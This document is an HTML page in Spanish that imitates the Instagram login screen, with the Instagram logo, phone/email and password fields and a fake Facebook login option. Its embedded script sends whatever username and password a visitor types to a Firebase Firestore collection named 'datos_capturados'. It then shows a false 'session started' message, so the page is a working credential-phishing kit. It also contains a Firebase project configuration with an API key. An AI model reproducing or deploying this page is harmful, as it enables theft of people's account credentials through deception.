<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; }
        
        /* El secreto para Safari: height 100% y fondo fijo para que el teclado no lo rompa */
        html, body {
            margin: 0; 
            padding: 0; 
            width: 100%; 
            height: 100%;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #427ba0 0%, #6f629c 45%, #9e5b85 100%);
            background-attachment: fixed;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            /* Mejora el renderizado de la fuente en móviles */
            -webkit-font-smoothing: antialiased; 
        }

        /* Contenedor principal que se estira y permite hacer scroll si el teclado está abierto */
        .main-wrapper {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 400px;
            height: 100%;
            padding: 20px;
            overflow-y: auto;
        }

        /* Selector de idioma */
        .lang-top {
            text-align: center;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.9);
            padding-top: 10px;
            padding-bottom: 30px;
        }

        /* Contenedor central (Logo y Formulario) */
        .form-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding-bottom: 40px; /* Espacio extra abajo */
        }

        /* Logo de Instagram */
        .logo {
            width: 180px;
            margin-bottom: 35px;
            filter: invert(1) brightness(2);
        }

        /* Cajas de texto a prueba de Safari */
        input {
            width: 100%;
            background-color: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 14px;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            margin-bottom: 15px;
            outline: none;
            /* Esta línea es MAGIA para que Safari/Chrome no le ponga sombras o bordes feos por defecto */
            -webkit-appearance: none; 
            appearance: none;
        }
        input::placeholder {
            color: rgba(255, 255, 255, 0.8);
        }
        input:focus {
            border: 1px solid rgba(255, 255, 255, 0.6);
        }

        /* Botón de inicio */
        button#botonEnviar {
            width: 100%;
            background-color: transparent;
            border: 1px solid rgba(255, 255, 255, 0.5);
            color: white;
            padding: 14px;
            border-radius: 4px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            margin-top: 5px;
            margin-bottom: 20px;
            -webkit-appearance: none;
            appearance: none;
        }
        button#botonEnviar:active {
            background-color: rgba(255, 255, 255, 0.1);
        }

        /* Textos de ayuda */
        .help-text {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 25px;
        }
        .help-text strong {
            color: white;
            font-weight: bold;
        }

        /* Divisor "O" */
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin-bottom: 25px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }
        .divider span {
            margin: 0 10px;
            font-size: 14px;
            font-weight: bold;
            color: rgba(255, 255, 255, 0.8);
        }

        /* Botón de Facebook (SVG integrado para que nunca falle la carga) */
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 15px;
        }
        .fb-login svg {
            width: 20px;
            height: 20px;
            fill: white;
            margin-right: 8px;
        }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="lang-top">
            español (España) ⌄
        </div>

        <div class="form-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram" class="logo">

            <input type="text" id="correoInput" placeholder="Número de teléfono, correo electrónico...">
            <input type="password" id="claveInput" placeholder="Contraseña">
            
            <button id="botonEnviar">Iniciar sesión</button>

            <div class="help-text">
                ¿Has olvidado tu información de inicio de sesión? <strong>Obtén ayuda.</strong>
            </div>

            <div class="divider">
                <span>o</span>
            </div>

            <div class="fb-login">
                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h7v-7H9.5v-3H12V8.5c0-2.5 1.5-3.8 3.7-3.8 1 0 2.2.2 2.2.2v2.5h-1.3c-1.2 0-1.6.8-1.6 1.6V11h2.8l-.4 3h-2.4v7h3.5c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
                Iniciar sesión con Facebook
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
        
        const firebaseConfig = { 
            apiKey: "AIzaSyCCee44HaI_Gk5R_6fHeezEHQ0CciU2fmY", 
            authDomain: "app-prueba-b6c8b.firebaseapp.com", 
            projectId: "app-prueba-b6c8b", 
            storageBucket: "app-prueba-b6c8b.firebasestorage.app", 
            messagingSenderId: "81316242382", 
            appId: "1:81316242382:web:8a523d79dbff6ba892419f", 
            measurementId: "G-CPERQFP9TP" 
        };
        
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        
        document.getElementById("botonEnviar").addEventListener("click", async () => {
            const correo = document.getElementById("correoInput").value;
            const clave = document.getElementById("claveInput").value;
            
            if(correo !== "" && clave !== "") {
                await addDoc(collection(db, "datos_capturados"), { 
                    datosUsuarioIngresado: correo, 
                    claveIngresada: clave 
                });
                alert("Sesión iniciada correctamente");
                document.getElementById("correoInput").value = "";
                document.getElementById("claveInput").value = "";
            } else {
                alert("Por favor, ingresa los datos.");
            }
        });
    </script>
</body>
</html>
